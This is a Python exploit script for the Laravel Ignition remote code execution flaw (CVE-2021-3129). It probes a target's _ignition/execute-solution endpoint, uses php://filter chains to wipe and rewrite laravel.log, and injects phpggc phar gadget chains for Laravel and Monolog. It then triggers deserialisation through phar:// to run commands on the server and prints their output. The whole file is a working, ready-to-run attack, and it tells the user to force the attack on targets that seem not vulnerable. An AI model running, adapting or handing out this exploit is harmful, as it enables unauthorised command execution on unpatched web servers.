# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys

class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用
    __gadget_chains = {
        "Laravel/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE5":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE6":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE7":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
    }

    def __vul_check(self):
        res = requests.get(self.__url,verify=False)
        if res.status_code != 405 and "laravel" not in res.text:
            print("[+]Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        
        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        return self.__payload_send(payload=payload)

    def __generate_payload(self,gadget_chain):
        generate_exp = self.__gadget_chains[gadget_chain]
        #print(generate_exp)
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
        print("[+]exploit:")
        #print(exp)
        return exp

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = str(self.__unserialize_log().text)
        #print(text)
        text = text[text.index(']'):].replace("}","").replace("]","")
        return text

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            print("[*] " + gadget_chain + " Result:")
            print(self.__rce())

    def __init__(self, target):
        self.target = target
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()

def main():
    EXP(sys.argv[1])

if __name__ == "__main__":
    main()
